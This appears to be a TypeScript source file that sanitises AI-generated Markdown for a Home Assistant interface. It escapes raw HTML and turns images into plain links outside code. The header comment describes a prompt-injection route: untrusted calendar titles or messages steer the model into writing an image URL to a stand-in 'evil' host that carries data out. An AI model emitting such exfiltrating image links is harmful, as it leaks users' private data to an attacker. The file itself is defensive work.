/**
 * AI answers are rendered as Markdown (HA's `ha-markdown`), but their text is
 * not trusted: the prompt carries run data (calendar titles, messages …) that
 * can steer the model into writing `![x](https://evil/?data=…)` or
 * `<img src=…>`, which the browser would load on its own and so leak that
 * data. `safeAiMarkdown` keeps the Markdown but turns every image into a
 * plain link (loaded only when clicked) and shows raw HTML as text. Code
 * stays as written — Markdown never renders HTML or images inside code.
 */

/** A fenced code block's opening line (CommonMark: up to 3 spaces, ``` or ~~~). */
const FENCE_OPEN = /^ {0,3}(`{3,}|~{3,})(.*)$/;

/** Neutralises one stretch of Markdown outside code. */
function neutralise(text: string): string {
  return text.replaceAll('<', '&lt;').replaceAll('![', '\\![');
}

/** Inline code spans (one backtick each side, on one line) stay; everything around them is neutralised. */
function neutraliseLine(line: string): string {
  let out = '';
  let last = 0;
  for (const match of line.matchAll(/(?<![`\\])`[^`\n]+`(?!`)/g)) {
    out += neutralise(line.slice(last, match.index)) + match[0];
    last = match.index + match[0].length;
  }
  return out + neutralise(line.slice(last));
}

/** Whether `line` closes the fence opened with `fence`. */
function closesFence(line: string, fence: string): boolean {
  const match = FENCE_OPEN.exec(line);
  return (
    match !== null &&
    match[1]?.[0] === fence[0] &&
    (match[1]?.length ?? 0) >= fence.length &&
    (match[2] ?? '').trim() === ''
  );
}

export function safeAiMarkdown(text: string): string {
  const lines = text.replace(/\r\n?/g, '\n').split('\n');
  const out: string[] = [];
  let fence: string | null = null;
  for (const line of lines) {
    if (fence !== null) {
      out.push(line);
      if (closesFence(line, fence)) fence = null;
      continue;
    }
    const open = FENCE_OPEN.exec(line);
    // A backtick fence's info string can't contain backticks (else it's inline code).
    if (open?.[1] && !(open[1].startsWith('`') && (open[2] ?? '').includes('`'))) {
      fence = open[1];
      out.push(line);
      continue;
    }
    out.push(neutraliseLine(line));
  }
  return out.join('\n');
}
